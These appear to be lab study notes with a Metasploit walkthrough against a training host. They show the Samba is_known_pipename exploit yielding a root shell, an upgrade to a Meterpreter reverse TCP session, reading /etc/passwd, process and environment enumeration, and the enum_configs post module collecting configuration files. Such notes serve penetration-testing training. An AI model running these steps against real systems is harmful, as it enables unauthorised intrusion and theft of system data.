# Linux Post Exploitation Modules

```bash
# Exploited Samba
msf6 exploit(linux/samba/is_known_pipename) > run

[*] 192.204.137.3:445 - Using location \\192.204.137.3\exploitable\tmp for the path
[*] 192.204.137.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.204.137.3:445 - Share 'exploitable' has server-side path '/
[*] 192.204.137.3:445 - Uploaded payload to \\192.204.137.3\exploitable\tmp\wUbGEOeG.so
[*] 192.204.137.3:445 - Loading the payload from server-side path /tmp/wUbGEOeG.so using \\PIPE\/tmp/wUbGEOeG.so...
[-] 192.204.137.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.204.137.3:445 - Loading the payload from server-side path /tmp/wUbGEOeG.so using /tmp/wUbGEOeG.so...
[+] 192.204.137.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.204.137.2:40687 -> 192.204.137.3:445) at 2025-07-25 11:40:01 +0530

# Current direction
pwd
/tmp
```

Upgrade session
```bash
^Z
Background session 1? [y/N]  y
msf6 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.204.137.2:40687 -> 192.204.
                                         137.3:445 (192.204.137.3)

msf6 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.204.137.2:4433 
[*] Sending stage (1017704 bytes) to 192.204.137.3
[*] Meterpreter session 2 opened (192.204.137.2:4433 -> 192.204.137.3:58090) at 2025-07-25 11:41:48 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         shell cmd/unix                           192.204.137.2:40687
                                                      -> 192.204.137.3:4
                                                     45 (192.204.137.3)
  2         meterpreter x86/li  root @ demo.ine.loc  192.204.137.2:4433
            nux                 al                   -> 192.204.137.3:58
                                                     090 (192.204.137.3)
```


```bash
msf6 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

# System information
meterpreter > sysinfo
Computer     : demo.ine.local
OS           : Debian 8.11 (Linux 6.8.0-48-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
# User ID
meterpreter > getuid
Server username: root
# Shell session
meterpreter > shell
Process 53 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
# User
root@demo:/tmp# whoami
whoami
root
# List all users
root@demo:/tmp# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
~~~~~~~~~~~~~
# Which group root belongs
root@demo:/tmp# groups root
groups root
root : root
# Operating system information
root@demo:/tmp# cat /etc/*issue
cat /etc/*issue
Debian GNU/Linux 8 \n \l
# Karnel information
root@demo:/tmp# uname -r
uname -r
6.8.0-48-generic
# Detailed
root@demo:/tmp# uname -a
uname -a
Linux demo.ine.local 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 GNU/Linux
# Interface information
root@demo:/tmp# ip a s
ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
119369: eth0@if119370: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:cc:89:03 brd ff:ff:ff:ff:ff:ff
    inet 192.204.137.3/24 brd 192.204.137.255 scope global eth0
       valid_lft forever preferred_lft forever
# Currently running processes
root@demo:/tmp# ps  aux
ps  aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  20052  2688 ?        Ss   06:00   0:00 /bin/bash /root/start.sh
root           9  0.0  0.0 292860 14620 ?        Ss   06:00   0:00 /usr/local/samba/sbin/smbd -D
root          10  0.0  0.0  47084 15360 ?        S    06:00   0:00 /usr/bin/python /usr/bin/supervisord -n
root          17  0.0  0.0 292860  6648 ?        S    06:00   0:00 /usr/local/samba/sbin/smbd -D
root          38  0.0  0.0   4344  1152 ?        S    06:09   0:00 /bin/sh
root          47  0.0  0.0   1184   768 ?        S    06:11   0:00 /tmp/DKEQM
root          53  0.0  0.0   4344  1152 ?        S    06:13   0:00 /bin/sh
root          54  0.0  0.0  20232  3072 ?        S    06:13   0:00 /bin/bash -i
root          68  0.0  0.0  17512  1536 ?        R    06:18   0:00 ps aux
# Environment Variables
root@demo:/tmp# env
env
USER=root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
PWD=/tmp
LANG=C
SHLVL=1
HOME=/root
_=/usr/bin/env
```

Modules for post exploitation
```bash
msf6 exploit(linux/samba/is_known_pipename) > search enum_configs
msf6 exploit(linux/samba/is_known_pipename) > use post/linux/gather/enum_configs
msf6 post(linux/gather/enum_configs) > set session 2
session => 2
msf6 post(linux/gather/enum_configs) > run

[*] Running module against 192.204.137.3 [demo.ine.local]
[*] Info:
[*]     Debian GNU/Linux 8
[*]     Linux demo.ine.local 6.8.0-48-generic 
#48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 GNU/Linux
[-] Failed to open file: /etc/apache2/apache2.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/apache2/ports.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/nginx/nginx.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snort/snort.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/my.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/ufw.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/sysctl.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1
[+] shells stored in /root/.msf4/loot/20250725115547_default_192.204.137.3_linux.enum.conf_928044.txt
[+] sepermit.conf stored in /root/.msf4/loot/20250725115547_default_192.204.137.3_linux.enum.conf_030794.txt
[+] ca-certificates.conf stored in /root/.msf4/loot/20250725115547_default_192.204.137.3_linux.enum.conf_325987.txt
[+] access.conf stored in /root/.msf4/loot/20250725115548_default_192.204.137.3_linux.enum.conf_967980.txt
[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1
[+] rpc stored in /root/.msf4/loot/20250725115548_default_192.204.137.3_linux.enum.conf_067921.txt
```





